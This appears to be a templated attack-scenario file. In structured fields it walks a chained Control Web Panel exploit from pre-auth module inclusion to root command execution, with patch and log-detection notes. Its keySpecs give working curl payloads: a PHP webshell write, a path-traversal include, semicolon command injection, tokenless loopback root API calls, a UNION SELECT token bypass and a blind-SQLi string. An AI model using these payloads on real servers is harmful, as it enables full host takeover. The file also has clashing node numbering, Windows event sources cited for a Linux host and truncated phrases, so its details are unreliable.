scenario.name: VulnCheck — Control Web Panel (CWP) Pre-Auth Module Dispatch to Root RCE (CVE-2026-73695..104080)
scenario.overview: Imagine a multi-tenant apartment building with a distracted lobby receptionist and an unlocked basement dumbwaiter leading straight to the superintendent boiler room. First, an intruder tests mailbox names and notices that even after the receptionist writes a move-along slip, she still fetches and opens whatever tenant folder was named on the form. Next, the intruder uses that unlocked folder to trigger a self-starting workshop drawer inside a tenant unit, rides the unguarded basement dumbwaiter up to the superintendent office, and slips a forged pass formula into the superintendent guestbook to seize full control of the whole building. In this scenario (T1190, VulnCheck, Control Web Panel (CWP) Pre-Auth Module Dispatch to Root RCE (CVE-2026-73695..104080)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: account Enumeration Oracle, Execution After, then pre-Auth Hosting User RCE, then loopback User API 127.0.0.1:2302 Missing, then oAuth Gate SQLi Bypass as root@localhost. Steps #1–#4 walk that chain end-to-end by covering Account Enumeration Oracle, Execution After, then Pre-Auth Hosting User RCE, then Loopback User API 127.0.0.1:2302 Missing, then OAuth Gate SQLi Bypass as root@localhost. Primary detection correlates Sysmon Event 1 with the documented host and network chain.

stages.title: Stage 1: Account Enumeration Oracle, Execution After Redirect (CVE-2026-73696) & Module LFI (CVE-2026-73695)
stages.subtitle: Initial Access (T1190 - Exploit Public-Facing Application)
stages.description: At the apartment lobby counter, the intruder reads the timing of buzzer responses to discover a real tenant name, then asks for an internal room folder without showing a key. The clerk stamps a redirect notice telling the intruder to leave, yet forgets to stop working and still pulls the requested folder off the shelf. On port 2083, cwpsrv routes requests matching https://host:2083/<username>/ to a dedicated per-user PHP-FPM Unix socket (returning HTTP 302 Found when the hosting account exists and HTTP 404 Not Found when the socket is absent, giving attackers a pre-auth username oracle). When an unauthenticated caller requests /labtest/index.php?module=..., CWPUserIndex::__construct invokes unauthenticatedFlow and UnauthenticatedFlowTrait::toLoginWithIntendedUri (which emits header Location: /login/?intended=... without calling exit under CVE-2026-73696, letting PHP execution fall straight through to the file-scope module dispatcher). At file scope, services/users/index.php reads CWPHttpRequest::get(module) through an anti-XSS filter that leaves ../, /, and . intact and executes include_once on /usr/local/cwpsrv/var/services/user_files/modules/$module_name.php (bypassing setModuleVars and checkIfModuleExists under CVE-2026-73695 so any user module or relative PHP file on disk is included without authentication). In the admin panel on port 2031, CWP calls header Location: /login followed immediately by exit (halting execution before any protected code loads), whereas the refactored user panel on port 2083 omitted exit inside UnauthenticatedFlowTrait::toLoginWithIntendedUri and omitted checkIfModuleExists before include_once (meaning every HTTP request to /<valid_user>/index.php?module=<target> executes the target module inside the hosting account's PHP-FPM pool before PHP flushes the cosmetic 302 redirect response). On the diagram, follow Step #1 / Link #1 (#1→ cwp-phpfpm: pool labtest /usr/local/cwpsrv/var/services/users/index.php?module=phpini_editor / ⇠#1 ACK 302) from Node ① (#1 External Attacker (HTTPS :2083)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Loopback User API (127.0.0.1:2302)).

stages.title: Stage 2: Pre-Auth Hosting Account RCE via phpini_editor.php (CVE-2026-73697) & protected_directory.php (CVE-2026-77876)
stages.subtitle: Execution (T1059.004 - Unix Shell / Webshell Drop)
stages.description: Because one of the tenant workshop drawers starts running its tools the instant anyone slides it open, the intruder simply names that drawer on the lobby request and immediately gains command execution inside that tenant apartment with zero login. Because modules/phpini_editor.php executes at file scope as soon as Stage 1 includes it, an unauthenticated attacker reaches two pre-auth sinks running as hosting user uid=1000 under CVE-2026-73697: first, acc=update reads $_POST[file] without path validation and writes title=value lines via file_put_contents (allowing a quote-free PHP payload to be split across title and value parameters into /tmp/evilmod.php and executed in-band via module path traversal), and second, acc=addlabelphpiniadv reads $_POST[hfilename] via trim and passes it unquoted into shell_exec rm -f (allowing semicolon command injection as the hosting user). In addition, modules/protected_directory.php exposes a third pre-auth command injection sink under CVE-2026-77876 (where acc=deletedp interpolates unescaped $_POST[file] directly into a shell_exec sed command targeting .htaccess). Even though CWPHttpRequest strips single and double quotes from POST parameters (attempting to neutralize basic string breakouts), splitting PHP open and close tags across the title and value arrays in phpini_editor.php acc=update requires zero quotes, and the shell_exec rm -f sink in acc=addlabelphpiniadv leaves $hfilename completely unquoted (letting semicolon chaining such as hfilename=x ; id ; echo run arbitrary commands as uid=1000 in a single POST request). On the diagram, follow Step #2 / Link #2 (#2→ sh -c rm -f x ; curl -sk https://127.0.0.1:2302/v1/restoredatabase/ --data-urlencode "file=/dev/null ; id > /tmp/root_proof ; echo" ; echo / ⇠#2 ACK 59) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 cwpsrv Nginx Proxy (:2083)), monitored by Node ⑥ (#6 Loopback User API (127.0.0.1:2302)).

keySpecs.value: curl -sk "https://cwp.corp.local:2083/labtest/index.php?module=phpini_editor&acc=update" --data "file=/tmp/evilmod.php&title=<?php system(\$_GET[c]);//,x&value= ?>,y"
curl -sk "https://cwp.corp.local:2083/labtest/index.php?module=../../../../../../../tmp/evilmod&c=id"  # Returns uid=1000(labtest) in-band before 302 body
curl -sk "https://cwp.corp.local:2083/labtest/index.php?module=phpini_editor&acc=addlabelphpiniadv" --data-urlencode "hfilename=x ; id > /tmp/proof ; echo"

Apply CWP patch 1.16 (0.9.8.1213+), which confines phpini_editor file operations via get_user_safe_path(), removes the dead rm -f $hfilename sink, and replaces sed -i in protected_directory.php with pure PHP file manipulation.
Execution (T1059.004 - Unix Shell / Webshell Drop)

stages.title: Stage 3: Single-Request Root Escalation via Loopback User API 127.0.0.1:2302 (CVE-2026-77877, CVE-2026-77878 & CVE-2026-104080)
stages.subtitle: Privilege Escalation (T1068 - Exploitation for Privilege Escalation)
stages.description: From inside the tenant apartment, the intruder opens the building internal basement dumbwaiter shaft that connects straight to the superintendent boiler room. Because the boiler-room intercom assumes only trusted staff can reach the basement shaft, it blindly runs the intruder maintenance command with master building privileges. Control Web Panel runs an internal Slim v2 User API bound to https://127.0.0.1:2302 whose PHP-FPM pool executes as root uid=0 (granting unrestricted OS control to any request that reaches its handlers). In services/user_api/v1/app/routes/api.php, multiple sensitive routes omit the access_token middleware entirely under CVE-2026-77877 (leaving critical root endpoints callable from localhost without credentials). From the Stage 2 command injection, the attacker sends a single loopback curl request to /v1/restoredatabase/ passing a semicolon-injected file parameter (which BackupHandler::restoreDBBackup concatenates directly into a root shell_exec mysql command under CVE-2026-77878), while the tokenless /valid_token/ route passes raw POST user into a root shell_exec grep command against /etc/passwd (providing a second independent root command injection under CVE-2026-104080). Because Stage 2 under CVE-2026-73697 can invoke curl directly inside its hfilename command injection payload (bridging the external port 2083 web session to the internal 127.0.0.1:2302 listener), the entire unauthenticated remote-to-root chain completes in one external HTTP POST request (spawning /bin/sh as uid=1000, relaying POST /v1/restoredatabase/ to localhost, and executing the injected pipeline as uid=0 root). On the diagram, follow Step #3 / Link #3 (#3→ sh -c mysql --defaults-extra-file=/root/.my.cnf < /dev/null ; id > /tmp/root_proof ; echo > /dev/null 2>&1 & / ⇠#3 ACK 59) from Node ③ (#3 cwpsrv Nginx Proxy (:2083)) to Node ④ (#4 cwp-phpfpm Pool (uid=1000)), monitored by Node ⑥ (#6 Loopback User API (127.0.0.1:2302)).

keySpecs.value: curl -sk https://127.0.0.1:2302/v1/restoredatabase/ --data-urlencode "file=/dev/null ; id > /tmp/root_proof ; echo"  # CVE-2026-77877 + CVE-2026-77878
shell_exec("mysql --defaults-extra-file=/root/.my.cnf < " . $file . " > /dev/null 2>&1 &"); // Executed as uid=0(root)
curl -sk https://127.0.0.1:2302/valid_token/ --data-urlencode "user=x' ; id > /tmp/valid_token_root ; '"  # CVE-2026-104080 root RCE

Upgrade to CWP patch 1.29/1.30 (Nov 2026), which enforces access_token() on all 127.0.0.1:2302 routes, validates database paths via cwp_api_safe_home_path(), and drops privileges via cwp_api_as_user() (runuser -u <user>).
Privilege Escalation (T1068 - Exploitation for Privilege Escalation)

stages.title: Stage 4: Loopback OAuth SQLi Auth Bypass (CVE-2026-77879), /v1/newpass/ Root RCE (CVE-2026-77880) & Blind SQLi (CVE-2026-77881)
stages.subtitle: Credential Access (T1552.001 - Credentials in Files / MySQL root@localhost)
stages.description: Even on the locked doors inside the superintendent office that do check a visitor passbook, the intruder writes a clever trick question into the pass lookup line that makes the ledger reply yes automatically, unlocking the master password reset desk to claim permanent control of the entire apartment complex. For routes on 127.0.0.1:2302 that do invoke the access_token middleware in services/user_api/v1/index.php, the function connects to MySQL using /root/.my.cnf as root@localhost and concatenates raw POST fields into SELECT * FROM oauth_authorization_codes (enabling a UNION SELECT SQL injection under CVE-2026-77879 that fabricates a 6-column row with a 2099 expiration timestamp, bypassing authentication on every token-gated route). With the gate bypassed, the attacker invokes /v1/newpass/, which validates password complexity on $pass but interpolates raw $user directly into shell_exec calling /usr/bin/passwd as root (achieving root RCE via semicolon injection in $user under CVE-2026-77880). Furthermore, /user_panel_dashboard/ and /valid_token/ concatenate $user into SELECT * FROM oauth_clients as root@localhost (exposing time-based blind SQLi over root_cwp and mysql.user under CVE-2026-77881). VulnCheck's IonCube bytecode analysis across CWP patches 1.8 through 1.30 (using icunpack to inspect obfuscated PHP handlers) showed that August 2026 updates patched only filemanager for CVE-2025-48703 while leaving the EAR flaw, module dispatcher, and loopback root API exposed until incremental September to November 2026 patches 1.12 through 1.30 added exit calls, basename/realpath module confinement, prepared SQL statements, cwp_clean_username, and cwp_api_as_user privilege dropping. On the diagram, follow Step #4 / Link #4 (#4→ sh -c ( echo A1!aaaaa; echo A1!aaaaa ) | /usr/bin/passwd z;id>/tmp/newpass_root;true / ⇠#4 ACK 59) from Node ④ (#4 cwp-phpfpm Pool (uid=1000)) to Node ⑤ (#5 Linux Auditd & cwpsrv Logs), monitored by Node ⑥ (#6 Loopback User API (127.0.0.1:2302)).

keySpecs.value: access_token="' UNION SELECT 'a','x','c','d','2099-01-01 00:00:00','f' -- -"  # CVE-2026-77879 OAuth gate bypass
curl -sk https://127.0.0.1:2302/v1/newpass/ --data-urlencode "access_token=..." --data-urlencode "user=z;id>/tmp/newpass_root;true" --data "pass=A1!aaaaa"  # CVE-2026-77880
curl -sk https://127.0.0.1:2302/user_panel_dashboard/ --data-urlencode "user=labtest\" AND (SELECT IF(1=1,SLEEP(2),0)) -- -"  # CVE-2026-77881 Blind SQLi

Replace string-concatenated SQL in access_token() and /user_panel_dashboard/ with parameterized prepared statements (CWP patch 1.16/1.27) and validate $user with cwp_clean_username() plus escapeshellarg() before invoking /usr/bin/passwd.
Credential Access (T1552.001 - Credentials in Files / MySQL root@localhost)

telemetry.info: CVE=CVE-2026-77879 (OAuth SQLi) + CVE-2026-77880 (/v1/newpass/ Root RCE) + CVE-2026-77881 (Blind SQLi) · DatabaseContext=MySQL root@localhost (/root/.my.cnf) · BypassedMiddleware=access_token() in services/user_api/v1/index.php · TargetTable=root_cwp.oauth_authorization_codes / root_cwp.user
telemetry.explanation: Even on the locked doors inside the superintendent office that do check a visitor passbook, the intruder writes a clever trick question into the pass lookup line that makes the ledger reply yes automatically, unlocking the master password reset desk to claim permanent control of the entire apartment complex. For routes on 127.0.0.1:2302 that do invoke the access_token middleware in services/user_api/v1/index.php, the function connects to MySQL using /root/.my.cnf as root@localhost and concatenates raw POST fields into SELECT * FROM oauth_authorization_codes (enabling a UNION SELECT SQL injection under CVE-2026-77879 that fabricates a 6-column row with a 2099 expiration timestamp, bypassing authentication on every token-gated route). With the gate bypassed, the attacker invokes /v1/newpass/, which validates password complexity on $pass but interpolates raw $user directly into shell_exec calling /usr/bin/passwd as root (achieving root RCE via semicolon injection in $user under CVE-2026-77880). Furthermore, /user_panel_dashboard/ and /valid_token/ concatenate $user into SELECT * FROM oauth_clients as root@localhost (exposing time-based blind SQLi over root_cwp and mysql.user under CVE-2026-77881). VulnCheck's IonCube bytecode analysis across CWP patches 1.8 through 1.30 (using icunpack to inspect obfuscated PHP handlers) showed that August 2026 updates patched only filemanager for CVE-2025-48703 while leaving the EAR flaw, module dispatcher, and loopback root API exposed until incremental September to November 2026 patches 1.12 through 1.30 added exit calls, basename/realpath module confinement, prepared SQL statements, cwp_clean_username, and cwp_api_as_user privilege dropping. (Audit MySQL general and slow query logs (recording every SQL statement executed by root@localhost against oauth_authorization_codes and oauth_clients) for UNION SELECT or SLEEP subqueries, and verify CWP is updated to build 0.9.8.1213+ / patch 1.30 confirming cwp_api_as_user and prepared statements are active. Correlate Sysmon Event 1 and Windows Security Event telemetry for T1552.001 (pairing parent/child process and destination fields) and contain the offending session.)

briefing.headline: Scenario Briefing: How the 10-CVE Control Web Panel (CWP2Shell) Chain Pivots from Pre-Auth Execution After Redirect to Root RCE
briefing.storyAnalogy: Imagine a multi-tenant apartment building with a distracted lobby receptionist and an unlocked basement dumbwaiter leading straight to the superintendent boiler room. First, an intruder tests mailbox names and notices that even after the receptionist writes a move-along slip, she still fetches and opens whatever tenant folder was named on the form. Next, the intruder uses that unlocked folder to trigger a self-starting workshop drawer inside a tenant unit, rides the unguarded basement dumbwaiter up to the superintendent office, and slips a forged pass formula into the superintendent guestbook to seize full control of the whole building.

briefing.plainSummary: In this scenario (T1190, VulnCheck, Control Web Panel (CWP) Pre-Auth Module Dispatch to Root RCE (CVE-2026-73695..104080)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: account Enumeration Oracle, Execution After, then pre-Auth Hosting User RCE, then loopback User API 127.0.0.1:2302 Missing, then oAuth Gate SQLi Bypass as root@localhost. Steps #1–#4 walk that chain end-to-end by covering Account Enumeration Oracle, Execution After, then Pre-Auth Hosting User RCE, then Loopback User API 127.0.0.1:2302 Missing, then OAuth Gate SQLi Bypass as root@localhost. Primary detection correlates Sysmon Event 1 with the documented host and network chain.
briefing.diagramTopologySummary: The topology traces 4 sequential stages across Node ① (External Attacker on port 2083), Node ② (cwpsrv Nginx reverse proxy), Node ③ (per-user cwp-phpfpm pool running as uid=1000 labtest), Node ④ (pre-auth module sink in phpini_editor.php), Node ⑤ (Loopback User API on 127.0.0.1:2302 running as uid=0 root and MySQL root@localhost), and Node ⑥ (Linux Auditd and cwpsrv SIEM sensor).

steps.plainTitle: Account Enumeration Oracle, Execution After Redirect (CVE-2026-73696) & Module LFI (CVE-2026-73695)
steps.storyAnalogy: At the apartment lobby counter, the intruder reads the timing of buzzer responses to discover a real tenant name, then asks for an internal room folder without showing a key. The clerk stamps a redirect notice telling the intruder to leave, yet forgets to stop working and still pulls the requested folder off the shelf.
steps.simpleExplanation: On port 2083, cwpsrv routes requests matching https://host:2083/<username>/ to a dedicated per-user PHP-FPM Unix socket (returning HTTP 302 Found when the hosting account exists and HTTP 404 Not Found when the socket is absent, giving attackers a pre-auth username oracle). When an unauthenticated caller requests /labtest/index.php?module=..., CWPUserIndex::__construct invokes unauthenticatedFlow and UnauthenticatedFlowTrait::toLoginWithIntendedUri (which emits header Location: /login/?intended=... without calling exit under CVE-2026-73696, letting PHP execution fall straight through to the file-scope module dispatcher). At file scope, services/users/index.php reads CWPHttpRequest::get(module) through an anti-XSS filter that leaves ../, /, and . intact and executes include_once on /usr/local/cwpsrv/var/services/user_files/modules/$module_name.php (bypassing setModuleVars and checkIfModuleExists under CVE-2026-73695 so any user module or relative PHP file on disk is included without authentication).
steps.howItWorksInPractice: In the admin panel on port 2031, CWP calls header Location: /login followed immediately by exit (halting execution before any protected code loads), whereas the refactored user panel on port 2083 omitted exit inside UnauthenticatedFlowTrait::toLoginWithIntendedUri and omitted checkIfModuleExists before include_once (meaning every HTTP request to /<valid_user>/index.php?module=<target> executes the target module inside the hosting account's PHP-FPM pool before PHP flushes the cosmetic 302 redirect response).
steps.diagramAlignment: On the diagram, follow Step #1 / Link #1 from Node ① (External Attacker) through Node ② (cwpsrv Nginx :2083) to Node ③ (cwp-phpfpm Pool uid=1000).
steps.detectionAndEvidence: Inspect /usr/local/cwpsrv/logs/access_log (the CWP Nginx web access log recording every port 2083 request and response size) for HTTP 302 responses on POST or GET requests to /<user>/index.php?module=... that contain non-zero response bodies or module query parameters, indicating pre-auth Execution After Redirect exploitation of CVE-2026-73696 and CVE-2026-73695.

steps.plainTitle: Pre-Auth Hosting User RCE via phpini_editor.php (CVE-2026-73697) & protected_directory.php (CVE-2026-77876)
steps.storyAnalogy: Because one of the tenant workshop drawers starts running its tools the instant anyone slides it open, the intruder simply names that drawer on the lobby request and immediately gains command execution inside that tenant apartment with zero login.
steps.simpleExplanation: Because modules/phpini_editor.php executes at file scope as soon as Stage 1 includes it, an unauthenticated attacker reaches two pre-auth sinks running as hosting user uid=1000 under CVE-2026-73697: first, acc=update reads $_POST[file] without path validation and writes title=value lines via file_put_contents (allowing a quote-free PHP payload to be split across title and value parameters into /tmp/evilmod.php and executed in-band via module path traversal), and second, acc=addlabelphpiniadv reads $_POST[hfilename] via trim and passes it unquoted into shell_exec rm -f (allowing semicolon command injection as the hosting user). In addition, modules/protected_directory.php exposes a third pre-auth command injection sink under CVE-2026-77876 (where acc=deletedp interpolates unescaped $_POST[file] directly into a shell_exec sed command targeting .htaccess).
steps.howItWorksInPractice: Even though CWPHttpRequest strips single and double quotes from POST parameters (attempting to neutralize basic string breakouts), splitting PHP open and close tags across the title and value arrays in phpini_editor.php acc=update requires zero quotes, and the shell_exec rm -f sink in acc=addlabelphpiniadv leaves $hfilename completely unquoted (letting semicolon chaining such as hfilename=x ; id ; echo run arbitrary commands as uid=1000 in a single POST request).
steps.diagramAlignment: On the diagram, follow Step #2 / Link #2 from Node ② (cwpsrv Nginx :2083) and Node ③ (cwp-phpfpm Pool) into Node ④ (phpini_editor.php Sink).
steps.detectionAndEvidence: Correlate cwpsrv access logs showing POST /<user>/index.php?module=phpini_editor&acc=update or acc=addlabelphpiniadv with Linux auditd SYSCALL execve records (syscall 59 capturing every newly spawned process and its parent) where php-fpm under a hosting UID >= 1000 spawns /bin/sh running rm -f or writes .php files into /tmp/.
